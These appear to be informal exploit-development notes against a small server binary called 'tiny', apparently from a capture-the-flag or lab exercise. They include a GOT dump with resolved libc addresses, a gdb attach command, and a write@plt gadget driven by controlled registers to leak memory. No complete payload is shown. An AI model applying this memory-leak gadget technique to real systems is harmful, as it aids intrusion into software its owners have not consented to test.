[0x59f5fde2ff68] __printf_chk@GLIBC_2.3.4  â†’  0x7d8964534ba0
[0x59f5fde2ff70] bind@GLIBC_2.2.5  â†’  0x7d89645274b0
[0x59f5fde2ff78] strftime@GLIBC_2.2.5  â†’  0x7d89644e0d40
[0x59f5fde2ff80] open@GLIBC_2.2.5  â†’  0x7d89645144e0
[0x59f5fde2ff88] perror@GLIBC_2.2.5  â†’  0x7d8964460e70
[0x59f5fde2ff90] fdopendir@GLIBC_2.4  â†’  0x7d89644e69e0
[0x59f5fde2ff98] accept@GLIBC_2.2.5  â†’  0x7d8964527410
[0x59f5fde2ffa0] strtoul@GLIBC_2.2.5  â†’  0x7d8964447520
[0x59f5fde2ffa8] exit@GLIBC_2.2.5  â†’  0x7d89644455f0
[0x59f5fde2ffb0] sleep@GLIBC_2.2.5  â†’  0x7d89644ea570
[0x59f5fde2ffb8] fstat@GLIBC_2.33  â†’  0x7d8964513cd0
[0x59f5fde2ffc0] fork@GLIBC_2.2.5  â†’  0x7d89644ea6a0
[0x59f5fde2ffc8] __sprintf_chk@GLIBC_2.3.4  â†’  0x7d8964534980
[0x59f5fde2ffd0] socket@GLIBC_2.2.5  â†’  0x7d8964527b30

```


- strlen
will clobber rdx with the content of rsi.
this is bad, becaise rsi must be a pointer,
and a pointer is too large for a valid rdx value.
the syscall will EFAULT



```
sudo -E gdb -p $(pgrep tiny)
```


wait this is good:
     0x000000000000260c <+45>:    mov    rdx,rbx
     0x000000000000260f <+48>:    mov    rsi,rbp
     0x0000000000002612 <+51>:    mov    edi,r12d
     0x0000000000002615 <+54>:    call   0x22d0 <write@plt>

this gives us access to write, by using
the registers we control:
rbx,rbp, r12
